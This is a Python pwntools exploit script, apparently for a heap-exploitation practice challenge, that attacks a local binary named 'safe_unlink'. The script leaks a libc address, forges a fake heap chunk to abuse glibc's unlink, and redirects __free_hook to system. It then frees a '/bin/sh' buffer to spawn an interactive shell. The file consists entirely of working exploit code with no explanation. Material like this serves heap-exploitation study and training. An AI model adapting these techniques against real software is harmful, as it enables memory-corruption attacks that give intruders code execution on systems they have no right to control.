#!/usr/bin/python

from pwn import *

def malloc(p, size):
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('size:')
    p.sendline(size)

def free(p, index):
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil('index:')
    p.sendline(index)

def edit(p, index, data):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('index:')
    p.sendline(index)
    p.recvuntil('data:')
    p.sendline(data)

def safe_unlink(p):
    ''''''
    libc = ELF('../.glibc/glibc_2.30_no-tcache/libc.so.6')

    m_array = 0x602060
    target = 0x602010

    bk_addr = p64(m_array - 0x10)
    fd_addr = p64(m_array - 0x18)

    for _ in range(6):
        data = p.recvline()
    puts_leak = int(data.split(b'@')[1].strip(), 16)
    libc.address = puts_leak - 0x6faf0
    

    malloc(p, b'198')
    malloc(p, b'198')

    #overwrite m_array index 0 with it's own addr
    edit(p, b'0', 
         p64(0)      + 
         p64(0xc1)   +
         fd_addr     + 
         bk_addr     +
         p64(0) * 20 +
         p64(0xc0)   +
         p64(0xd0)   
    )

    free(p, b'1')

    #index 0 now points near m_array, overwrite it again with target addr
    edit(p, b'0',
        p64(0) * 3  +
        p64(libc.symbols['__free_hook'] - 8) +
        b'AAA'
    )

    #overwrite base 
    edit(p, b'0',
        b'/bin/sh\0' +
        p64(libc.symbols['system'])
    )

    free(p, b'0')

p = process('./safe_unlink')
#p = gdb.debug('./safe_unlink', '''
#c
#''')

safe_unlink(p)

p.interactive()
